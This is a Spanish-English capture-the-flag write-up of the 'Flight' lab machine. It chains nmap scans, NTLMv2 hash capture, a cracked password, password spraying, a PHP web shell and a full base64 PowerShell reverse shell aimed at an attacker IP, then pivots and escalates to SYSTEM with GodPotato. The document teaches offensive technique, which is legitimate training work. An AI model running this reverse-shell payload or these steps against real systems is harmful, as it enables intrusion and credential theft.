OS: Windows

```ruby
sudo nmap 10.129.228.120 -p- --min-rate 5000 -sS -Pn -n -oN ports
```

```ruby
# Nmap 7.99 scan initiated Fri Jun 12 18:23:57 2026 as: /usr/lib/nmap/nmap --privileged -oX - -p- --min-rate 5000 -sS -Pn -n -oN /home/juan/Hacking/Flight/nmap/ports 10.129.228.120
Nmap scan report for 10.129.228.120
Host is up (0.17s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49692/tcp open  unknown

# Nmap done at Fri Jun 12 18:24:37 2026 -- 1 IP address (1 host up) scanned in 39.67 seconds

```

Ahora haremos un escaneo preciso a cada puerto encontrado:

```ruby
sudo nmap 10.129.228.120 -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49692 -sCV -T5 -vvv -oN Exact_scan
```

```ruby
# Nmap 7.99 scan initiated Fri Jun 12 18:24:37 2026 as: /usr/lib/nmap/nmap --privileged -oX - -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49692 -sCV -T5 -vvv -oN /home/juan/Hacking/Flight/nmap/Exact_scan 10.129.228.120
Nmap scan report for 10.129.228.120
Host is up, received echo-reply ttl 127 (0.18s latency).
Scanned at 2026-06-12 18:24:38 EDT for 106s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-13 05:24:45Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50845/tcp): CLEAN (Timeout)
|   Check 2 (port 23690/tcp): CLEAN (Timeout)
|   Check 3 (port 21917/udp): CLEAN (Timeout)
|   Check 4 (port 7712/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-06-13T05:25:39
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 12 18:26:24 2026 -- 1 IP address (1 host up) scanned in 106.64 seconds

```

Because of the ports (53,88,135,445) its obvious that we are in front of an AD, apart from that, I saw the 80 port Open, this is a possible foothold through web application, let's see what we can found there:

Okay, here I see a few of apartados but any of them have info, everything redirect to index.html#:

![[Captura de pantalla 2026-08-08 a las 11.31.38 p. m..png]]

Something similar happens with the option to buy tickets online:

![[Captura de pantalla 2026-08-08 a las 11.31.32 p. m..png]]


Before of start testing all of the possible web vulns (XXE, SQLI, XSS, Command injection, etc...) me di cuenta de que el boton ***GO!***, lo unico que hacia era redirigir hacia index.html#: 

![[Captura de pantalla 2026-08-08 a las 11.47.05 p. m..png]]

No enviaba un post a ninguna parte, entonces, en vez de perder tiempo con ello, decidí fuzzear la web en busca de subdirectorios y subdominios, para ello, primero es necesario añadir el dominio flight.htb, que lo encontramos en la parte inferior de la pagina:

![[Pasted image 20260809133055.png]]

Lo enlazamos a la IP de la maquina en el archivo /etc/hosts:


![[Captura de pantalla 2026-08-09 a las 1.32.02 p. m..png]]

Perfecto, ahora podemos hacer una busqueda de subdominios:

Mandamos ffuf y vemos que hay muchas respuestas con la misma respuesta (falsos positivos), entonces tenemos que  filtrar para que no nos muestre estos resultados:

![[Pasted image 20260809133857.png]]

Podemos usar la flag -fs 7069, y esto nos desvela un subdominio

![[Captura de pantalla 2026-08-09 a las 1.34.12 p. m..png]]

Lo agregamos a  nuestro /etc/hosts para poder visitar la pagina:

![[Captura de pantalla 2026-08-09 a las 1.32.13 p. m..png]]

Ya entrando a la pagina veo un posible LFI (Local File Inclusion):

![[Pasted image 20260809135050.png]]

Primero tenia que descartar si la función que está llamando a los archivos es una función sensible del tipo include() o un simple get_file_contents(), por lo que llamé directamente al archivo index.php, si me mostraba el código significaba que por detrás hacia un get_file_contents y no incluía el código, lo mostraba en texto claro:

![[Pasted image 20260809135709.png]]

Esto baja un poco la severidad de la vulnerabilidad transformandose en un path traversal, pero eso no quita que podamos hacer algunas cosas interesantes, por ejemplo, hacer que la pagina (por ende el usuario/SPN que la administra ) nos mande una solicitud de autenticacion y asi obtengamos su hash NTLMv2:

Primero debemos ponernos a la escucha usando responder o smbserver:

```ruby
sudo responder -dwv -I tun0 
```

Ahora, hacemos que el servidor mande una petición a nuestro servicio SMB:

![[Captura de pantalla 2026-08-09 a las 2.00.57 p. m..png]]

Y efectivamente recibimos el hash NTLMv2, es hora de crackearlo:

![[Captura de pantalla 2026-08-09 a las 2.00.43 p. m..png]]

Lo crackeamos utilizando John The Ripper:

![[Captura de pantalla 2026-08-09 a las 2.04.00 p. m..png]]

Esto nos da como resultado la contraseña `S@Ss!K@*t13` para el usuario `svc_apache`, ya con credenciales podemos probar muchas cosas, lo primero que hago al conseguir credenciales es obtener la lista de usuarios y probar la misma contraseña con todos los usuarios:\

Conseguir la lista de usuarios:

![[Captura de pantalla 2026-08-09 a las 2.24.56 p. m..png]]

Probar la misma credencial con todos los usuarios:

![[Captura de pantalla 2026-08-09 a las 2.27.07 p. m..png]]

Perfecto, S.Moon está reutilizando la credencial de svc_apache, veamos a que recursos compartidos tiene acceso este usuario:

![[Captura de pantalla 2026-08-09 a las 4.50.57 p. m..png]]

Tenemos permisos de escritura sobre el recurso Shared, al entrar nos damos cuenta de que no hay nada, ni archivos ni carpetas:

Pero esto no es impedimento para conseguir algo, cuando podemos meter un archivo en una amquina windows, hay varios archivos que por el simple hecho de ser vistos en el explorador de archivos, podemos obtener hashes NTLMv2 de quienes vean esos archivos, el archivo mas famoso para esto son los .scf, así intentemos subirlo:

![[Captura de pantalla 2026-08-09 a las 5.07.13 p. m..png]]

Vemos que nos da un access denied, seguramente porque no permite subir ciertas extensiones de archivos, para bypassear esto podemos usar [este](https://github.com/Greenwolf/ntlm_theft) Repositorio que basicamente va a generar todos los posibles archivos maliciosos:

![[Captura de pantalla 2026-08-09 a las 5.11.05 p. m..png]]

Ahora los subimos con un simple Oneliner:

![[Captura de pantalla 2026-08-09 a las 5.10.56 p. m..png]]

Como ya teniamos ***responder*** activado de antes, me llegó el hash NTLMv2 de c.bum:

![[Captura de pantalla 2026-08-09 a las 5.12.56 p. m..png]]

Ahora tenemos que crackearlo:

![[Captura de pantalla 2026-08-09 a las 5.14.34 p. m..png]]

Vemos que este usuario tiene pernmisos de escritura en el recurso que aloja las paginas web flight.htb y school.flight.htb:

![[Captura de pantalla 2026-08-09 a las 5.21.36 p. m..png]]

Creamos una web shell en php, y la subimos:

![[Captura de pantalla 2026-08-09 a las 5.26.10 p. m..png]]

Ahora visitamos ese archivo en la pagina de flight.htb e indicamos el parametro cmd con el comando a ejecutar:

![[Pasted image 20260809172759.png]]

Creamos la reverse shell:

![[Captura de pantalla 2026-08-09 a las 6.42.35 p. m..png]]


Nos ponemos a la escucha:

```ruby

sudo nc -lvnp 4444
```

Enviamos la revershell:

```ruby
http://flight.htb/evil.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA1ADUAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

Recibimos la conexión:

![[Captura de pantalla 2026-08-09 a las 6.48.57 p. m..png]]

No vemos ningun privilegio i mportante que nos permita escalar, por lo que debemos buscar alguna via alternativa, veamos que servicios hay abiertos de forma interna:

Primero listamos los puertos que están abiertos de forma interna:

```ruby
netstat -ano | findstr 'LISTENING'
```

![[Captura de pantalla 2026-08-10 a las 1.44.20 p. m..png]]

Ahoar podemos usar mi herramienta letshack para que nos diga la diferencia entre los puertos abiertos externamente que habiamos visto con Nmap y los que encontramos con netstat:

```ruby
letshack internal_ports prots.grep netstat.output 
```

![[Captura de pantalla 2026-08-10 a las 1.47.59 p. m..png]]

Vemos WinRM, HTTPS, y una muys posible pagina interna en el puerto 8000 (HTTP alternative), es probable que se trate de un servidor IIS, para confirmarlo podemos irnos a la raiz de la maquina:

![[Captura de pantalla 2026-08-10 a las 2.32.37 p. m..png]]

Vemos la carpeta inetpub (perteneciente a inetpub), dentro de inetpub hay varias carpetas:

![[Captura de pantalla 2026-08-10 a las 2.39.26 p. m..png]]

Listamos lo que hay dentro de todas estas carpetas de forma recursiva:

```ruby
gci -recurse
```

Encontramos quedentro de `development` hay uan estrutura similar a la de una web:
![[Captura de pantalla 2026-08-10 a las 2.38.43 p. m..png]]

y si vemos los permisos que hay dentrod e esta carpeta vemos que C.Bum (conseguido anteriormente) tiene permisos para editar dentro de esta caperta:

![[Captura de pantalla 2026-08-10 a las 2.41.54 p. m..png]]

Nosotros ya tenemos las credenciales para este usuario, podemos usar RunasCs para hacer movimiento lateral y obtener una shell como C.Bum, para ello, primero debemos pasarnos RunasCs.exe.

Hosteamos el archivo:

![[Pasted image 20260810161328.png]]

Y lo llamamos usando certutil:

![[Captura de pantalla 2026-08-10 a las 4.16.15 p. m..png]]

Usamos runas para cambiarnos de usuario.

Nos ponemos a la escucha:

![[Captura de pantalla 2026-08-10 a las 4.18.35 p. m..png]]

Mandamos la conexión:

![[Captura de pantalla 2026-08-10 a las 4.17.27 p. m..png]]

La recibimos:

![[Captura de pantalla 2026-08-10 a las 4.19.16 p. m..png]]

Ahora, como C.bum, subimos una reverse shell en aspx:

![[Captura de pantalla 2026-08-10 a las 4.19.40 p. m..png]]

Ahora debemos acceder a esa web interna, para ello debemos pivotear usando chisel, nos transferimos chisel primeramente:

![[Captura de pantalla 2026-08-10 a las 8.21.04 p. m..png]]

Iniciamos el servidor:

![[Captura de pantalla 2026-08-10 a las 9.01.33 p. m..png]]

Mandamos la conexión de chisel:

![[Captura de pantalla 2026-08-10 a las 9.02.08 p. m..png]]

Ahora, esto al ser una conexión por socks, podemos usar foxyproxy en nuestro navegador, para de forma comoda acceder a la web interna, vamos a configurarlo:

![[Captura de pantalla 2026-08-10 a las 9.09.32 p. m..png]]

Accedemos al archivo WebShell.aspx que subimos hace un momento:

![[Captura de pantalla 2026-08-10 a las 9.06.48 p. m..png]]

Nos ponemos a la escucha (otra vez :P):

![[Captura de pantalla 2026-08-10 a las 9.11.20 p. m..png]]

Enviamos la conexión una reverse shell de tipo powershell por base64:

![[Captura de pantalla 2026-08-10 a las 9.16.05 p. m..png]]

Como lo esperaba, entramos como el usuario ***`iis apppool`***, usualmente, este usuario tiene un permiso de SeImpersonatePrivilege, y eso en Windows se traduce en... NT Authority System (Administrador)!!!: 

![[Captura de pantalla 2026-08-10 a las 9.17.43 p. m..png]]

Vamos a usar GodPotato.

Primero nos lo transferimos y luego hacemos que se ejecute una reverse shell hacia nosotros, nos ponemos a la escucha por el puerto 5555:

![[Captura de pantalla 2026-08-10 a las 9.25.52 p. m..png]]

lo enviamos:

![[Captura de pantalla 2026-08-10 a las 9.22.42 p. m..png]]

Y recibimos una shell como ***`NT AUTHORITY\SYSTEM*`**:

![[Captura de pantalla 2026-08-10 a las 9.24.16 p. m..png]]


# Maquina completada! :D